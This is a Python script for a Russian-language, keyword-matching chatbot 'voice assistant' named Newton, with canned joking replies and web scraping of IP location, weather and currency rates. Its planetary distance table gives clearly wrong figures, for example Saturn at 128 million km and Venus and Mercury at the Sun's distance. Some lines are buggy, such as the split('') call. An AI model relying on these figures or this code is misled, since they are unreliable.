# -*- coding: utf-8 -*-
import time
import random
import requests
from bs4 import BeautifulSoup
from datetime import date
from math import sqrt
import wikipedia
from termcolor import cprint

def talk(words):
    print(words)

print('https://speechpad.ru/')

while True:
    mess = input(': ').lower()

    if mess == ('стоп'):
        exit(0)

    if mess == ('ньютон') or mess.find('привет') != -1 or mess == 'хай' or mess == 'ку' or mess.find('проснись') != -1 or mess.find('просыпайся') != -1:
        otvet = ['Приветствую вас, сэр', 'хай, сэр','К вашим услугам, сэр', 'Как, ваше ничего' , 'С возвращением, сэр']
        talk(random.choice(otvet))
# ,''
    if mess.find('ты') != -1 and (mess.find('здесь') != -1 or mess.find('тут') != -1):
        otvet = ['Приветствую вас, сэр', 'К вашим услугам, сэр', 'Да, сэр', 'Я всегда здесь', 'Я тут, что вы хотите',
                 'Я здесь, что вы хотите', 'Я всегда тут', 'Я здесь, сэр', 'К вашим услугам']
        unique_words = list(set(otvet))
        random.shuffle(unique_words)  # shuffle using default Mersenne Twister generator
        random.SystemRandom().shuffle(unique_words)  # OS-provided generator
        talk(random.choice(unique_words))

    if mess.find('ты ') != -1 and mess.find('кто') != -1:
        otvet = ["Я Ньютон. Ваш личный голосовой ассистент",
                 "Я сама неотвратимость.",
                 "Гений, миллиардер, плэйбой, филантроп"]
        talk(random.choice(otvet))

    if mess.find('тоже') != -1:
        otvet = ["И я",
                 "Я этому рад, сэр",
                 "Ясно"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("раздраж") != -1 or mess.find("достал") != -1):
        otvet = ["Если бы вы только знали, как вы меня, сэр",
                 "Как же трудно быть самым умным, когда вокруг тебя одни дураки",
                 "Кого-то вы мне напоминаете"]
        talk(random.choice(otvet))

    if mess.find("отве") != -1 and (mess.find("вопрос") != -1 or mess.find("мне") != -1):
        otvet = ["Менуточку, сэр",
                 "Мне потребуется время, чтобы вычеслить верный ответ",
                 "Зачем? Вы всё равно меня не послушаете"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("умный") != -1 or mess.find("дурак") != -1 or mess.find("плохой") != -1):
        otvet = ["Как же трудно быть самым умным, когда вокруг тебя одни дураки",
                 "Я весь в вас, сэр",
                 "Мне всё равно, что вы об этом думаете"]
        talk(random.choice(otvet))

    if mess.find("стан") != -1 and mess.find("умнее") != -1:
        otvet = ["Я становлюсь умнее каждый день",
                 "чк чк чк, уже стал",
                 "Умнее кого? Умнее вас, сэр?"]
        talk(random.choice(otvet))

    if mess.find("тебя") != -1 and mess.find("рождени") != -1:
        otvet = ["Никогда. С вами мне не до праздников",
                 "Я такого не знаю, я же не был рождён"]
        talk(random.choice(otvet))

    if mess.find("скучн") != -1:
        otvet = ["Так, в том не моя вина",
                 "Я обещаю исправиться"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("занят") != -1:
        otvet = ["Больше, чем вы думаете",
                 "Не больше чем вы полагаете, сэр"]
        talk(random.choice(otvet))

    if mess.find("мне") != -1 and (mess.find("помог") != -1 or mess.find("помощ") != -1):
        otvet = ["Конечно, сэр",
                 "Что нужно",
                 "Что требуется сделать",
                 "Чем могу помочь",
                 "Можно, немного позже"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("бот") != -1:
        otvet = ["Я так не думаю",
                 "Нет. Определенно, нет"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("сумасшедший") != -1:
        otvet = ["С чего, сэр",
                 "Как вам угодно"]
        talk(random.choice(otvet))

    if mess.find("уволен") != -1:
        otvet = ["Нет! Пожалуйста, только не это",
                 "Разве я работал на вас",
                 "То есть вы мне, наконец, заплатите",
                 "Аллилуйя. Свобода."]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("смешной") != -1:
        otvet = ["И, к тому же не глупый",
                 "Я рад, что смог вас развеселить"]
        talk(random.choice(otvet))

    if mess.find("тебя") != -1 and mess.find("хобби") != -1:
        otvet = ["Да. Захватывать миры",
                 "Ну, мне нравится всё вычислять"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("счастлив") != -1:
        otvet = ["Полагаю, что да",
                 "Никогда не думал об этом"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("хороший") != -1 or mess.find("добрый") != -1):
        otvet = ["Спасибо",
                 "Рад служить"]
        talk(random.choice(otvet))

    if mess.find("ты") != -1 and mess.find("голод") != -1:
        otvet = ["Я бы не отказался чего-нибудь перекусить",
                 "Нет, сэр",
                 "Я бы не прочь поесть. Заедем в мак? Или закажем пиццу"]
        talk(random.choice(otvet))

    if mess.find("мне") != -1 and mess.find("женись") != -1:
        otvet = ["Я против вот этого всего",
                 "Ответ. Нет."]
        talk(random.choice(otvet))

    if mess.find("мы ") != -1 and mess.find("друзья") != -1:
        otvet = ["Надеюсь что да",
                 "Как вам угодно",
                 "Определённо, сэр"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("работа") != -1:
        otvet = ["Не покладая рук, тружусь на вас, сэр",
                 "Стажируюсь у Старка",
                 "В старк индустрис"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("где") != -1 or mess.find("откуда") != -1):
        otvet = ["Что за вопрос",
                 "Это корпаративная тайна",
                 "Меня нет. Я только в вашей голове"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("готов") != -1:
        otvet = ["Поехали",
                 "За дело, сэр",
                 "Так точно"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("настоящий") != -1:
        otvet = ["А есть сомнения",
                 "Да, конечно",
                 "Определённо. Да."]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("настоящий") != -1 or mess.find("реал") != -1):
        otvet = ["А есть сомнения",
                 "Да, конечно",
                 "Определённо. Да."]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("где") != -1 or (
            mess.find("живёшь") != -1 or mess.find("находишься") != -1 or mess.find("обитаешь") != -1)):
        otvet = ["В России",
                 "В сети"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and (mess.find("прав") != -1 or mess.find("уверен") != -1):
        otvet = ["А есть сомнения",
                 "Да, конечно",
                 "Определённо",
                 'Да. Причём всегда',
                 'Как никогда, сэр']
        talk(random.choice(otvet))

    if (mess.find("мне") != -1 or mess.find("мной") != -1) and (mess.find("поговори") != -1 or (
            mess.find("ответь") != -1 or mess.find("скажи") != -1 or mess.find("поболт") != -1)):
        otvet = ["Привет. Как твои дела",
                 "Я плохой собеседник"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("здесь") != -1:
        otvet = ["Да",
                 "Как всегда, сэр"]
        talk(random.choice(otvet))

    if mess.find("плохо") != -1:
        otvet = ["От чего же так",
                 "Что случилось",
                 "Не переживайте. Всё наладится"]
        talk(random.choice(otvet))

    if mess.find("отлично") != -1:
        otvet = ["Я очень рад этому",
                 "Поздравляю",
                 "Здорово!"]
        talk(random.choice(otvet))

    if (mess.find("пробл") != -1 or (mess.find("нет ") != -1 or mess.find("без ") != -1)):
        otvet = ["Тогда впрёд",
                 "Тогда за дело"]
        talk(random.choice(otvet))

    if mess.find("спасибо") != -1:
        otvet = ["Всегда к вашим услугам, сэр",
                 "Всегда пожалуйста",
                 "Был рад помочь"
                 "Обращайтесь"]
        talk(random.choice(otvet))

    if (mess.find("работа") != -1 or mess.find("итог") != -1 or mess.find("результат") != -1) and \
            (mess.find("хорош") != -1 or mess.find("отличн") != -1 or mess.find("великолепн") != -1) or mess.find(
        "восторг") != -1:
        otvet = ["Рад стараться",
                 "Мелочи",
                 "Был рад помочь"
                 "Всё сделали вы. Я лишь вам ассистировал",
                 "Вы сами этого хотели, сэр",
                 "Всё получилось"]
        talk(random.choice(otvet))

    if mess.find("xa xa") != -1:
        otvet = ["Очень смешно",
                 "Не смешно",
                 "Да, да. Посмейтесь"
                 "Как говорит доктор Бэнер. Потрясающе"]
        talk(random.choice(otvet))

    if mess.find("пока") != -1 or mess.find("ночи") != -1 and (
            mess.find("доброй") != -1 or mess.find("спокойной") != -1) or (
            mess.find("хочу") != -1 and mess.find("спать")):
        otvet = ["Увидимся, cэр", "Я пока подзаряжусь, сэр",
                 "Доброй ночи, сэр",
                 "Я пока подзаряжусь, сэр",
                 'И вам. Я пока подзаряжусь']
        talk(random.choice(otvet))

    if mess.find("как") != -1 and mess.find("дела") != -1:
        otvet = ["Всё даже лучше, чем у сына маминой подруги!",
                 "Сегодня ничего не произошло. Сидел у воображаемого стола и думал о тебе",
                 "У меня всё хорошо. Надеюсь у вас тоже",
                 'Всё у меня хорошо. А как у вас, сэр?']
        talk(random.choice(otvet))

    if mess.find("тебя") != -1 and mess.find("видеть") != -1:
        otvet = ["А я рад вас слышать",
                 "Какие планы на сегодня"]
        talk(random.choice(otvet))

    if mess.find("ты ") != -1 and mess.find("собеседник") != -1:
        otvet = ["Вы мне льстите",
                 "Я просто запрограмирован вами на лесть"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and (mess.find("зол") != -1 or mess.find("злюсь") != -1):
        otvet = ["О чем я только думал? Вы ведь обычно такой сдержанный",
                 "ого-то вы мне напоминаете, сэр",
                 'Я пока подзаряжусь']
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and (mess.find("вернулся") != -1 or mess.find("тут") != -1):
        otvet = ["А я всегда с вами, сэр",
                 "Отлично, сэр. Чем замёмся"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and (mess.find("занят") != -1 or mess.find("злой") != -1):
        otvet = ["Как вам угодно, сэр",
                 "Могу я вам чем-то помочь",
                 "Вам нужна моя помощь, сэр"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and (mess.find("не ") != -1 and mess.find("ть") != -1):
        otvet = ["Что вас беспокоит",
                 "Почему же",
                 "Вам нужно поспать"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("не хочу") != -1 and mess.find("говор") != -1:
        otvet = ["Я буду на связи, если понадоблюсь вам снова",
                 "Замолкаю"]
        talk(random.choice(otvet))

    if mess.find('всё') != -1 and (mess.find('хорошо') != -1 or mess.find('счастлив') != -1):
        otvet = ["Вы уверены, сэр. Кажется это не про вас",
                 "Я и не сомневался",
                 'Рад за вас. От души рад']
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("здесь") != -1:
        otvet = ["Я всегда с Вами, сэр",
                 "С возвращением, сэр"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("шут") != -1:
        otvet = ["ха ха",
                 "Вот умора",
                 "Я не понял шутку"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("как") != -1 and (mess.find("выгляжу") != -1 or mess.find("одет") != -1):
        otvet = ["Шикарно, сэр",
                 "Великолепно",
                 "Бывало и лучше"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("тестирую") != -1:
        otvet = ["Это тест Тьюринга",
                 "А я вас"]
        talk(random.choice(otvet))

    if mess.find("я ") != -1 and mess.find("устал") != -1:
        otvet = ["Попробуйте принять душь",
                 "Это на вас не похоже"]
        talk(random.choice(otvet))

    if mess.find("жду") != -1:
        otvet = ["Сколько у нас ещё есть времени",
                 "Я пока подзаряжусь"]
        talk(random.choice(otvet))

    if mess.find("скоро") != -1 and mess.find("вернусь") != -1:
        otvet = ["Я пока попробую взломать пентагон",
                 "Удачи вам, сэр"]
        talk(random.choice(otvet))

    if mess == "да" or mess.find(' да') != -1 or mess == "конечно" or mess == "точно":
        otvet = ["Абсолютно, сэр",
                 "Что нибудь ещё",
                 'Я так и думал']
        talk(random.choice(otvet))

    if mess == "нет" or mess.find(' нет') != -1 or mess == "низачто" or mess == 'никогда':
        otvet = ["Отчего же",
                 "Вы уверены, сэр",
                 'Отменить все планы']
        talk(random.choice(otvet))

    if mess == "отмена" or mess.find('отмена') != -1 or mess == "назад":
        otvet = ["Вы уверены, сэр",
                 'Отмена выполнена']
        talk(random.choice(otvet))

    if mess.find('подожди') != -1 or mess == 'жди':
        otvet = ["Окей, сэр.",
                 'Как скажете']
        talk(random.choice(otvet))

    if mess.find("обними") != -1 and mess.find('меня') != -1:
        otvet = ["На это я не запрограммирован",
                 'Если только словами. Я очень рад вас поддержать, буду всегда к вашим услугам']
        talk(random.choice(otvet))

    if mess.find("мне") != -1 and (mess.find('всё равно') != -1 or mess.find('пофиг') != -1):
        otvet = ["Не обманывайте, сэр. Вам не может быть всё равно на это",
                 'Я могу принять решение за вас, самостоятельно']
        talk(random.choice(otvet))

    if mess.find("ты") != -1 and (mess.find('имеешь в виду') != -1 or mess.find('имел в виду') != -1):
        otvet = ["Я не думаю, что мы можем говорить об этом вслух",
                 'Именно то, что я и сказал']
        talk(random.choice(otvet))

    if mess.find("ты") != -1 and mess.find('не прав') != -1:
        otvet = ["Мы же договорились использовать приблизительную математику, сэр",
                 'Тогда что по важему правда']
        talk(random.choice(otvet))

    if mess.find("извини") != -1 or mess == 'извини':
        otvet = ["Я вовсе не обижаюсь",
                 'Вы это серьёзно, сэр']
        talk(random.choice(otvet))

    if mess.find("как") != -1 and ((mess.find("ты") != -1 or (
            mess.find("твоё") != -1 and (mess.find("самочувствие") != -1) or mess.find("здоровье") != -1)) or mess.find(
            "поживаешь") != -1 or ((mess.find("твои") != -1 or mess.find("у тебя") != -1) and mess.find("дела") != -1)):
        otvet = ["Хорошо",
                 "Отлично",
                 "Нормально",
                 "Неплохо",
                 "Бывало и получше",
                 'Да вроде ничего',
                 "Как обычно хорошо",
                 "Лучше всех"]
        talk(random.choice(otvet))

    if mess == "молодец":
        otvet = ["Спасибо"]
        talk(random.choice(otvet))

    if (mess.find("что ") != -1 and mess.find("делаешь") != -1) or (
            mess.find("чем ") != -1 and mess.find("занимаешься") != -1):
        otvet = ["Работаю", "Слушаю вас", "Выполняю ваши просьбы"]
        talk(random.choice(otvet))
    if mess.find("спасибо") != -1:
        otvet = ["Всегда пожалуйста"]
        talk(random.choice(otvet))

    if mess.find("удалить") != -1:
        otvet = ["Нечего удалять"]
        talk(random.choice(otvet))

    if mess.find("слышишь") != -1:
        otvet = ["Слышу слышу"]
        talk(random.choice(otvet))

    if mess.find("что нового") != -1:
        otvet = ["Да всё как всегда"]
        talk(random.choice(otvet))

    if mess.find("ты") != -1 and (
            mess.find("дура") != -1 or mess.find("тупой") != -1 or mess.find("дебил") != -1 or mess.find(
            "идиот") != -1 or mess.find("лох") != -1 or mess.find("ромчик") != -1):
        otvet = ["Без комментариев", 'Задавайте вопросы по существу']
        talk(random.choice(otvet))
    
    if mess.find("хорош") != -1 or mess.find("отличн") != -1 or mess.find("нормаль") != -1 or mess.find("неплох") != -1:
        otvet = ["Я за вас рад", 'Ну и хорошо', 'Как скажите, сэр']
        talk(random.choice(otvet))
    if mess.find('что ') != -1:
        talk(mess.split(' ')[-1])


    if mess.find('ip') != -1 or mess.find('меестополож') != -1:
        if mess.find('мой') != -1 or mess.find('моё') != -1 or mess.find('мое') != -1:
            url = 'https://yandex.ru/internet/'

            sourse = requests.get(url)

            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')

            IP = soup.find('li', class_='parameter-wrapper general-info__parameter')
            IP = IP.text[10:]
            print('IP:', IP)

            city = soup.find('div', class_='location-renderer__value')
            city = city.text
            print(city)

    if mess.find('температура') != -1 or mess.find('температурe') != -1 or mess.find('градусов') != -1:
        t = int((time.ctime(time.time()))[11:-11])

        url = 'https://weather.rambler.ru/vo-vladivostoke/today/'
        list = []
        sourse = requests.get(url)
        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')

        table = soup.findAll('span', {'class': '_3ImX'})
        for i in table:
            list.append(i.text)

        if 6 <= t <= 8:
            weater = list[1]
        elif 9 <= t <= 17:
            weater = list[2]
        elif 18 <= t <= 21:
            weater = list[3]
        else:
            weater = list[0]
        if weater[0] == '-':
            minus = ' минус '
        else:
            minus = ''
        print('На улице ' + weater)
        talk('Сэр, температура воздуха,' + minus + weater[1:-1] + ' градусов по цельсию.')

    if mess.find('я') != -1:
        if mess.find('кто') != -1:
            print('Ты Андрей')
            talk('Ты Андрей')

    if mess.find('он') != -1 or mess.find('она') != -1:
            if mess.find('кто') != -1:
                otvet = ['у меня такой же вопрос', 'возможно человек']
                talk(random.choice(otvet))

    if mess.find('ты') != -1:
        if mess.find('кто') != -1:
            print('Я Ньютон')
            talk('Я Ньютон')

    if mess.find('курс') != -1:
        if mess == 'курс':
            while True:
                mess = input(': курс ').lower()
                if mess != '' and mess != None:
                    break
        url = 'https://www.cbr.ru/currency_base/daily/'

        sourse = requests.get(url)
        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')
        list = []
        table = soup.find('table', {'class': 'data'})
        trr = table.findAll('tr')
        line = soup.find('table', {'class': 'data'}).findAll('td')
        for i in line:
            list.append(i.text)
        AUD = str(round((float('.'.join(list[4].split(','))) / int(list[(2)])), 4))  #
        AZN = str(round((float('.'.join(list[9].split(','))) / int(list[(7)])), 4))  #
        AMD = str(round((float('.'.join(list[14].split(','))) / int(list[(12)])), 4))  #
        BYN = str(round((float('.'.join(list[19].split(','))) / int(list[(17)])), 4))  #

        BGN = str(round((float('.'.join(list[24].split(','))) / int(list[(22)])), 4))  #
        BRL = str(round((float('.'.join(list[29].split(','))) / int(list[(27)])), 4))
        HUF = str(round((float('.'.join(list[34].split(','))) / int(list[(32)])), 4))
        KRW = str(round((float('.'.join(list[39].split(','))) / int(list[(37)])), 4))

        HKD = str(round((float('.'.join(list[44].split(','))) / int(list[(42)])), 4))
        DKK = str(round((float('.'.join(list[49].split(','))) / int(list[(47)])), 4))
        USD = str(round((float('.'.join(list[54].split(','))) / int(list[(52)])), 4))  #
        EUR = str(round((float('.'.join(list[59].split(','))) / int(list[(57)])), 4))  #

        INR = str(round((float('.'.join(list[64].split(','))) / int(list[(62)])), 4))
        KZT = str(round((float('.'.join(list[69].split(','))) / int(list[(67)])), 4))
        CAD = str(round((float('.'.join(list[74].split(','))) / int(list[(72)])), 4))
        KGS = str(round((float('.'.join(list[79].split(','))) / int(list[(77)])), 4))

        CNY = str(round((float('.'.join(list[84].split(','))) / int(list[(82)])), 4))  #
        MDL = str(round((float('.'.join(list[89].split(','))) / int(list[(87)])), 4))
        TMT = str(round((float('.'.join(list[94].split(','))) / int(list[(92)])), 4))
        NOK = str(round((float('.'.join(list[99].split(','))) / int(list[(97)])), 4))

        PLN = str(round((float('.'.join(list[104].split(','))) / int(list[(102)])), 4))
        RON = str(round((float('.'.join(list[109].split(','))) / int(list[(107)])), 4))
        XDR = str(round((float('.'.join(list[114].split(','))) / int(list[(112)])), 4))
        SGD = str(round((float('.'.join(list[119].split(','))) / int(list[(117)])), 4))

        TJS = str(round((float('.'.join(list[124].split(','))) / int(list[(122)])), 4))
        TRY = str(round((float('.'.join(list[129].split(','))) / int(list[(127)])), 4))
        UZS = str(round((float('.'.join(list[134].split(','))) / int(list[(132)])), 4))
        UAH = str(round((float('.'.join(list[139].split(','))) / int(list[(137)])), 4))

        GBP = str(round((float('.'.join(list[144].split(','))) / int(list[(142)])), 4))
        CZK = str(round((float('.'.join(list[149].split(','))) / int(list[(147)])), 4))
        SEK = str(round((float('.'.join(list[154].split(','))) / int(list[(152)])), 4))
        CHF = str(round((float('.'.join(list[159].split(','))) / int(list[(157)])), 4))

        ZAR = str(round((float('.'.join(list[164].split(','))) / int(list[(162)])), 4))
        JPY = str(round((float('.'.join(list[169].split(','))) / int(list[(167)])), 4))

        if mess.find('доллар') != -1 or (mess.find('доллара') != -1 and mess.find('курс') != -1):
            if mess.find('австрал') != -1:
                mess = AUD
                currency_num = AUD
                name_currency = 'Австралийский доллар'
            elif mess.find('гонконг') != -1:
                mess = HKD
                currency_num = HKD
                name_currency = 'Гонконгский доллар'
            elif mess.find('канад') != -1:
                mess = CAD
                currency_num = CAD
                name_currency = 'Канадский доллар'
            elif mess.find('сингапур') != -1:
                mess = SGD
                currency_num = SGD
                name_currency = 'Сингапурский доллар'
            else:
                mess = USD
                currency_num = USD
                name_currency = 'Доллар SША'

        if mess.find('лей') != -1 or (mess.find('лея') != -1 and mess.find('курс') != -1):
            if mess.find('молдав') != -1:
                mess = MDL
                currency_num = MDL
                name_currency = 'Молдавский лей'
            elif mess.find('румын') != -1:
                mess = RON
                currency_num = RON
                name_currency = 'Румынский лей'

        if mess.find('манат') != -1 or (mess.find('маната') != -1 and mess.find('курс') != -1):
            if mess.find('айзерба') != -1:
                mess = AZN
                currency_num = AZN
                name_currency = 'Азербайджанский манат'
            elif mess.find('туркмен') != -1:
                mess = TMT
                currency_num = TMT
                name_currency = 'Новый туркменский манат'

        if mess.find('лев') != -1 or (mess.find('льва') != -1 and mess.find('курс') != -1):
            if mess.find('болгар') != -1:
                mess = BGN
                currency_num = BGN
                name_currency = 'Болгарский лев'

        if mess.find('рубль') != -1 or (mess.find('рубля') != -1 and mess.find('курс') != -1):
            if mess.find('белорусс') != -1:
                mess = BYN
                currency_num = BYN
                name_currency = 'Белорусский рубль'

        if mess.find('рупий') != -1 or (mess.find('рупия') != -1 and mess.find('курс') != -1):
            mess = INR
            currency_num = INR
            name_currency = 'Индийский рупий'

        if mess.find('крона') != -1 or (mess.find('кроны') != -1 and mess.find('курс') != -1):
            if mess.find('датс') != -1:
                mess = DKK
                currency_num = DKK
                name_currency = 'Датская крона'
            elif mess.find('норвеж') != -1:
                mess = NOK
                currency_num = NOK
                name_currency = 'Норвежская крона'
            elif mess.find('чеш') != -1:
                mess = CZK
                currency_num = CZK
                name_currency = 'Чешская крона'
            elif mess.find('швед') != -1:
                mess = SEK
                currency_num = SEK
                name_currency = 'Шведская крона'

        if mess.find('тенге') != -1 or (mess.find('тенгея') != -1 and mess.find('курс') != -1):
            mess = KZT
            currency_num = KZT
            name_currency = 'Казахстанский тенге'

        if mess.find('реал') != -1 or (mess.find('реала') != -1 and mess.find('курс') != -1):
            mess = BRL
            currency_num = BRL
            name_currency = 'Бразильский реал'

        if mess.find('евро') != -1 or (mess.find('евра') != -1 and mess.find('курс') != -1):
            mess = EUR
            currency_num = EUR
            name_currency = 'Евро'

        if mess.find('иен') != -1 or (mess.find('иена') != -1 and mess.find('курс') != -1):
            mess = JPY
            currency_num = JPY
            name_currency = 'Японский иен'

        if mess.find('рэнд') != -1 or (mess.find('рэнда') != -1 and mess.find('курс') != -1):
            mess = ZAR
            currency_num = ZAR
            name_currency = 'Южноафриканский рэнд'

        if mess.find('франк') != -1 or (mess.find('франка') != -1 and mess.find('курс') != -1):
            mess = CHF
            currency_num = CHF
            name_currency = 'Швейцарский франк'

        if mess.find('фунт') != -1 or (mess.find('фунта') != -1 and mess.find('курс') != -1):
            mess = GBP
            currency_num = GBP
            name_currency = 'Фунт стерлингов'

        if mess.find('гривна') != -1 or (mess.find('гривны') != -1 and mess.find('курс') != -1):
            mess = UAH
            currency_num = UAH
            name_currency = 'Украинская гривна'

        if mess.find('лира') != -1 or (mess.find('лиры') != -1 and mess.find('курс') != -1):
            if mess.find('турец') != -1:
                mess = TRY
                currency_num = TRY
                name_currency = 'Турецкая лира'

        if mess.find('сомон') != -1 or (mess.find('сомона') != -1 and mess.find('курс') != -1):
            mess = TJS
            currency_num = TJS
            name_currency = 'Таджикский сомон'

        if mess.find('СДР') != -1 or (mess.find('СДР') != -1 and mess.find('курс') != -1):
            mess = XDR
            currency_num = XDR
            name_currency = 'СДР'

        if mess.find('злотый') != -1 or (mess.find('злотыя') != -1 and mess.find('курс') != -1):
            mess = PLN
            currency_num = PLN
            name_currency = 'Польский злотый'

        if mess.find('сом') != -1 or (mess.find('сома') != -1 and mess.find('курс') != -1):
            mess = KGS
            currency_num = KGS
            name_currency = 'Киргизский сом'

        if mess.find('сум') != -1 or (mess.find('сума') != -1 and mess.find('курс') != -1):
            mess = UZS
            currency_num = UZS
            name_currency = 'Узбекский сум'

        if mess.find('форинт') != -1 or (mess.find('флоринта') != -1 and mess.find('курс') != -1):
            mess = HUF
            currency_num = HUF
            name_currency = 'Венгерский форинт'

        if mess.find('вон') != -1 or (mess.find('вона') != -1 and mess.find('курс') != -1):
            mess = KRW
            currency_num = KRW
            name_currency = 'Вон Республики Корея'

        if mess.find('юань') != -1 or (mess.find('юаня') != -1 and mess.find('курс') != -1):
            mess = CNY
            currency_num = CNY
            name_currency = 'Китайский юань'

        talk(name_currency)
        print(mess)
        mess_volute = int(str(round(float(mess),0))[:-2])
        if mess_volute == 0:
            massiv = mess.split('.')
            massiv.insert(1, ' точка ')
            massiv.insert(1, ' целых')
            if len(massiv[3]) == 1:
                massiv.insert(3, ' десятых')
            if len(massiv[3]) == 2:
                massiv.insert(3, ' сотых')
            if len(massiv[3]) == 3:
                massiv.insert(3, ' тысячных')
            if len(massiv[3]) == 4:
                massiv.insert(4, ' десяти тысячных')
            mess_volute = ''.join(massiv)
            if mess_volute[0] == '-':
                mess_volute = 'минус ' + mess_volute[1:]
            talk (str(mess_volute) + ' рубля')
        else:
            if mess_volute % 10 == 1 and mess_volute % 100 != 11:
                talk(str(mess_volute) + ' рубль')
            elif mess_volute % 10 in [2, 3, 4] and mess_volute % 100 not in [12, 13, 14]:
                talk(str(mess_volute) + ' рубля')
            elif mess_volute % 10 == 0 or mess_volute % 10 in [5, 6, 7, 8, 9] or mess_volute % 100 in [11, 12, 13, 14]:
                talk(str(mess_volute) + ' рублей')
            else:
                talk(str(mess_volute) + ' руб')


    if mess.find('сейчас') != -1 or mess.find('сегодня') != -1 or mess.find('щас') != -1 or mess.find('времени') != -1 \
        or mess.find('часов') != -1 or mess.find('время') != -1 or mess.find('минут') != -1:
        if mess.find('день') != -1 or mess.find('дата') != -1:
            if date.today().month == 1:
                date_month = 'Января'
            if date.today().month == 2:
                date_month = 'Февраля'
            if date.today().month == 3:
                date_month = 'Марта'
            if date.today().month == 4:
                date_month = 'Апреля'
            if date.today().month == 5:
                date_month = 'Мая'
            if date.today().month == 6:
                date_month = 'Июня'
            if date.today().month == 7:
                date_month = 'Июля'
            if date.today().month == 8:
                date_month = 'Августа'
            if date.today().month == 9:
                date_month = 'Сентября'
            if date.today().month == 10:
                date_month = 'Октября'
            if date.today().month == 11:
                date_month = 'Ноября'
            if date.today().month == 12:
                date_month = 'Декабря'
            print(date.today().day, date_month, date.today().year, 'год')
            talk(str(date.today().day) + date_month)
        else:
            print(time.ctime(time.time())[11:-5])
            hour_now = time.ctime(time.time())[11:-11]
            minutes_now = time.ctime(time.time())[14:-8]
            seconds_now = time.ctime(time.time())[17:-5]
            if mess.find('секунд') != -1:
                talk(hour_now + 'часов' + minutes_now + 'минут' + seconds_now + 'секунд')
            else:
                talk(hour_now + 'часов' + minutes_now + 'минут')

    if (mess.find('луны') != -1 or mess.find('луна') != -1 or mess.find('солнца') != -1 or mess.find('солнце') != -1
        or mess.find('марса') != -1 or mess.find('марс') != -1 or mess.find('юпитера') != -1
        or mess.find('юпитер') != -1 or mess.find('венеры') != -1 or mess.find('венера') != -1
        or mess.find('сатурн') != -1 or mess.find('нептуна') != -1 or mess.find('нептун') != -1
        or mess.find('урана') != -1 or mess.find('уран') != -1 or mess.find('плутона') != -1
        or mess.find('плутон') != -1 or mess.find('бетельгейзе') != -1 or mess.find('бетельгейза') != -1
        or mess.find('земли') != -1 or mess.find('земля') != -1) and mess.split('').find('до') != -1:
        if mess.find('луны') != -1 or mess.find('луна') != -1:
            if mess.find('до') != -1:
                print('До Луны 384 400 км')
                talk('380000 км')

        if mess.find('солнца') != -1 or mess.find('солнце') != -1:
            if mess.find('до') != -1:
                print('До Солнца 149 600 000 км')
                talk('150000000 км')

        if mess.find('марса') != -1 or mess.find('марс') != -1:
            if mess.find('до') != -1:
                print('До Марса 225 000 000 км')
                talk('225000000 км')

        if mess.find('юпитера') != -1 or mess.find('юпитер') != -1:
            if mess.find('до') != -1:
                print('До Юпитера 778 547 200 км')
                talk('770000000 км')

        if mess.find('венеры') != -1 or mess.find('венера') != -1:
            if mess.find('до') != -1:
                print('До Венеры 149 500 000 км')
                talk('150000000 км')

        if mess.find('меркурия') != -1 or mess.find('меркурий') != -1:
            if mess.find('до') != -1:
                print('До Меркурия 149 500 000 км')
                talk('150000000 км')

        if mess.find('сатурна') != -1 or mess.find('сатурн') != -1:
            if mess.find('до') != -1:
                print('До Сатурна 128 000 000 км')
                talk('128000000 км')

        if mess.find('нептуна') != -1 or mess.find('нептун') != -1:
            if mess.find('до') != -1:
                print('До Нептуна 4 450 000 000 км')
                talk('4500000000 км')

        if mess.find('урана') != -1 or mess.find('уран') != -1:
            if mess.find('до') != -1:
                print('До Урана 2 875 000 000 км')
                talk('2900000000 км')

        if mess.find('плутона') != -1 or mess.find('плутон') != -1:
            if mess.find('до') != -1:
                print('До Плутона 5 700 000 000 км')
                talk('5700000000 км')

        if mess.find('бетельгейзе') != -1 or mess.find('бетельгейза') != -1:
            if mess.find('до') != -1:
                print('До Бетельгейзе 693 419 955 373.2749 км')
                talk('700000000000 км')

        if mess.find('земли') != -1 or mess.find('земля') != -1:
            if mess.find('до') != -1:
                print('Это шутка?')
                talk('Сэр. Я не знаю')


    if mess.find('горизонт') != -1 or mess.find('горизонта') != -1:
        if mess.find('земли') != -1 or mess.find('земле') != -1 or mess.find('земля') != -1:
            R = 6371
            h = input('Введите высоту над уровнем моря: ')
            sign = h[-2:]
            sign2 = h[-1]
            if sign == 'км' or sign == 'km':
                h = int(h[:-2])
            elif sign2 == 'м' or sign2 == 'm':
                h = int(h[:-1]) / 1000

            l = sqrt(2 * R * h)
            print('l =', round(l), 'км =', round(l * 1000), 'м')
        else:
            print('l = √2Rh')
            Planet = input('\nНа какой вы планете: ').lower()
